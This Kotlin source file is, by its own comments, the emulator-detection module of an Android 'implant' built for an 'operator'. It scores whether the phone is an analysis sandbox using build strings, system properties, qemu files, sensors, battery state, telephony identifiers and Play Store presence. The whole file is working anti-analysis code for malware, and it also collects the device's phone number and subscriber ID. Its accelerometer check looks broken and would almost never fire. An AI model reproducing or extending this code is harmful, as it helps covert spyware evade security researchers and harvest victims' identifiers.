package io.umbra.beacon

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import java.io.File

/**
 * The laboratory around the phone.
 *
 * The implant that runs in an emulator is worth nothing to the operator,
 * and an implant that announces itself is worse than none.  The posture
 * engine of [Evasion] reads the strings of the build; this module reads
 * the *sensors* as well, because the sensors are what an emulator cannot
 * fake convincingly:
 *
 *   * an emulator has no accelerometer, or one that never moves;
 *   * its battery is a plug that never runs down;
 *   * its radio is a stub: the number of the simulator is the same on
 *     every installation and the cell tower is a constant;
 *   * the files of the qemu machine are in the file system.
 *
 * The answer is a score with the reasons behind it, not a word: the
 * operator decides what to do with it.
 */
object Lab {
    /** The number the android simulator gives to every installation. */
    const val SIMULATOR_NUMBER = "15555215554"

    /** The subscriber id of the simulator. */
    const val SIMULATOR_SUBSCRIBER = "310260000000000"

    /**
     * The verdict of the laboratory.
     *
     * The score is the number of signals that fired, the confidence is
     * how many of them are strong, and the reasons say which ones.
     */
    class Verdict(
        val emulated: Boolean,
        val confidence: Int,
        val reasons: List<String>,
        val sensors: Map<String, String>,
    ) {
        /** The verdict as text. */
        fun text(): String {
            val out = StringBuilder()
            out.append("emulator.detect: ")
            out.append(if (emulated) "this phone looks like a laboratory" else "this phone looks like a real phone")
            out.append(" (confidence $confidence%)\n")
            for ((key, value) in sensors) {
                out.append("emulator.detect: $key = $value\n")
            }
            if (reasons.isEmpty()) {
                out.append("emulator.detect: no signal fired\n")
            }
            for (reason in reasons) {
                out.append("emulator.detect: $reason\n")
            }
            return out.toString()
        }

        /** The verdict as a value. */
        fun value(): Upk {
            return Upk.map(
                "emulated" to Upk.bool(emulated),
                "confidence" to Upk.num(confidence.toLong()),
                "reasons" to Upk.Arr(reasons.map { Upk.str(it) }),
                "sensors" to Upk.map(
                    *sensors.map { (key, value) -> key to Upk.str(value) }.toTypedArray(),
                ),
            )
        }
    }

    /**
     * Look at the phone and say what it is.
     *
     * Every signal is worth a point; the strong ones are worth three.
     * The verdict says "laboratory" when the strong signals fired or
     * when the weak ones are many.
     */
    fun inspect(context: Context): Verdict {
        val reasons = mutableListOf<String>()
        val sensors = LinkedHashMap<String, String>()
        var score = 0

        // ---- the strings of the build ---------------------------------
        val fingerprint = (Build.FINGERPRINT ?: "").lowercase()
        val model = (Build.MODEL ?: "").lowercase()
        val product = (Build.PRODUCT ?: "").lowercase()
        val hardware = (Build.HARDWARE ?: "").lowercase()
        val board = (Build.BOARD ?: "").lowercase()
        val device = (Build.DEVICE ?: "").lowercase()
        val brand = (Build.BRAND ?: "").lowercase()
        // There is no Build.PRODUCT_DEVICE: the property ro.product.device
        // is what Build.DEVICE reads, so the product device is the device
        // of the build.  The key stays in the scan below because the report
        // has always named it, and its value is the one the platform has.
        val productDevice = (Build.DEVICE ?: "").lowercase()
        sensors["fingerprint"] = fingerprint
        sensors["model"] = model
        sensors["hardware"] = hardware
        sensors["brand"] = brand

        for ((name, value) in listOf(
            "fingerprint" to fingerprint,
            "model" to model,
            "product" to product,
            "hardware" to hardware,
            "board" to board,
            "device" to device,
            "product_device" to productDevice,
        )) {
            for (needle in listOf("emulator", "sdk", "goldfish", "ranchu", "vbox", "genymotion", "nox", "bluestacks", "andy", "ttVM")) {
                if (value.contains(needle.lowercase())) {
                    reasons.add("the $name says '$needle'")
                    score += 3
                    break
                }
            }
        }
        if (brand == "generic" && device == "generic") {
            reasons.add("the brand and the device are both 'generic'")
            score += 2
        }
        if (Build.PRODUCT == "sdk" || Build.PRODUCT == "sdk_gphone" || Build.PRODUCT == "sdk_x86") {
            reasons.add("the product is '${Build.PRODUCT}'")
            score += 3
        }

        // ---- the properties of the system ----------------------------
        val buildProp = readFile("/system/build.prop")
        for (needle in listOf("ro.kernel.qemu=1", "ro.hardware=ranchu", "ro.hardware=goldfish", "ro.product.model=sdk", "ro.boot.hardware=ranchu", "qemu.sf")) {
            if (buildProp.contains(needle)) {
                reasons.add("the system property '$needle' is set")
                score += 3
                break
            }
        }
        val cpuInfo = readFile("/proc/cpuinfo")
        if (cpuInfo.contains("android emulator") || cpuInfo.contains("goldfish") || cpuInfo.contains("ranchu")) {
            reasons.add("the processor says it is an emulator")
            score += 3
        }
        val mounts = readFile("/proc/mounts")
        if (mounts.contains("qemu")) {
            reasons.add("the mounts mention a qemu device")
            score += 1
        }
        for (path in listOf("/dev/socket/qemud", "/dev/qemu_pipe", "/system/lib/libc_malloc_debug_qemu.so")) {
            if (File(path).exists()) {
                reasons.add("the file '$path' exists")
                score += 3
                break
            }
        }

        // ---- the sensors ----------------------------------------------
        val manager = context.getSystemService(Context.SENSOR_SERVICE) as? SensorManager
        val accelerometers = manager?.getSensorList(Sensor.TYPE_ACCELEROMETER) ?: emptyList()
        val gyroscopes = manager?.getSensorList(Sensor.TYPE_GYROSCOPE) ?: emptyList()
        val magnetometers = manager?.getSensorList(Sensor.TYPE_MAGNETIC_FIELD) ?: emptyList()
        sensors["accelerometer"] = if (accelerometers.isEmpty()) "absent" else "present"
        sensors["gyroscope"] = if (gyroscopes.isEmpty()) "absent" else "present"
        sensors["magnetometer"] = if (magnetometers.isEmpty()) "absent" else "present"
        if (accelerometers.isEmpty() && gyroscopes.isEmpty()) {
            reasons.add("the phone has neither an accelerometer nor a gyroscope")
            score += 3
        } else if (accelerometers.isEmpty()) {
            reasons.add("the phone has no accelerometer")
            score += 2
        }
        val movement = sensorMovement(manager)
        if (movement.isNotEmpty()) {
            sensors["movement"] = movement
            if (movement.startsWith("still")) {
                reasons.add("the accelerometer never moves")
                score += 2
            }
        }

        // ---- the battery ------------------------------------------------
        val battery = batteryIntent(context)
        if (battery != null) {
            val level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
            val status = battery.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val plugged = battery.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0)
            sensors["battery"] = "$level/$scale"
            sensors["battery_status"] = "$status"
            sensors["battery_plugged"] = "$plugged"
            if (level >= 0 && scale > 0 && level == scale && status == BatteryManager.BATTERY_STATUS_FULL) {
                reasons.add("the battery is full and plugged in")
                score += 1
            }
        }

        // ---- the radio ---------------------------------------------------
        val telephony = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        if (telephony != null) {
            val number = try {
                telephony.line1Number
            } catch (_: Throwable) {
                null
            }
            val subscriber = try {
                telephony.subscriberId
            } catch (_: Throwable) {
                null
            }
            sensors["line1"] = number ?: "unknown"
            sensors["subscriber"] = subscriber ?: "unknown"
            if (number == SIMULATOR_NUMBER) {
                reasons.add("the number of the phone is the number of the simulator")
                score += 3
            }
            if (subscriber == SIMULATOR_SUBSCRIBER) {
                reasons.add("the subscriber id is the id of the simulator")
                score += 3
            }
            val phoneType = try {
                telephony.phoneType
            } catch (_: Throwable) {
                TelephonyManager.PHONE_TYPE_NONE
            }
            sensors["phone_type"] = "$phoneType"
            if (phoneType == TelephonyManager.PHONE_TYPE_NONE) {
                reasons.add("the phone has no radio")
                score += 1
            }
        }

        // ---- the shop ------------------------------------------------------
        val shop = try {
            context.packageManager.getPackageInfo("com.android.vending", 0)
            true
        } catch (_: Throwable) {
            false
        }
        sensors["play_store"] = shop.toString()
        if (!shop) {
            reasons.add("the phone has no play store")
            score += 1
        }

        // ---- the verdict ----------------------------------------------------
        val strong = reasons.count { it.contains("simulator") || it.contains("emulator") || it.contains("qemu") || it.contains("property") || it.contains("processor") }
        val confidence = ((score * 100) / 12).coerceIn(0, 99)
        val emulated = strong >= 2 || score >= 6
        return Verdict(emulated, confidence, reasons, sensors)
    }

    /**
     * Watch the accelerometer for a moment.
     *
     * A real phone moves; a table that stands still on a desk does not
     * either, so the reading is reported and the verdict weighs it
     * lightly.
     */
    private fun sensorMovement(manager: SensorManager?): String {
        if (manager == null) return ""
        val sensor = manager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER) ?: return ""
        val latch = java.util.concurrent.CountDownLatch(1)
        var last = FloatArray(3)
        var samples = 0
        val listener = object : SensorEventListener {
            override fun onSensorChanged(event: SensorEvent) {
                last = event.values.copyOf()
                samples++
                if (samples >= 20) latch.countDown()
            }

            override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {
                // The accuracy does not matter for the movement.
            }
        }
        return try {
            manager.registerListener(listener, sensor, SensorManager.SENSOR_DELAY_NORMAL)
            latch.await(3, java.util.concurrent.TimeUnit.SECONDS)
            manager.unregisterListener(listener)
            if (samples == 0) return ""
            val magnitude = Math.sqrt(
                (last[0] * last[0] + last[1] * last[1] + last[2] * last[2]).toDouble(),
            )
            if (magnitude < 0.2) "still" else "moving"
        } catch (_: Throwable) {
            ""
        }
    }

    /**
     * The state of the battery, read from the sticky broadcast.
     *
     * The sticky intent is the only way to read the battery without a
     * listener: the flag keeps the receiver out of the exported set on
     * the phones that ask for it.
     */
    private fun batteryIntent(context: Context): Intent? {
        val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        return try {
            context.registerReceiver(null, filter, Context.RECEIVER_NOT_EXPORTED)
        } catch (_: Throwable) {
            try {
                context.registerReceiver(null, filter)
            } catch (_: Throwable) {
                null
            }
        }
    }

    /** The content of a file, or the empty string when it is not readable. */
    private fun readFile(path: String): String {
        return try {
            val file = File(path)
            if (!file.isFile) return ""
            file.readText().lowercase()
        } catch (_: Throwable) {
            ""
        }
    }
}
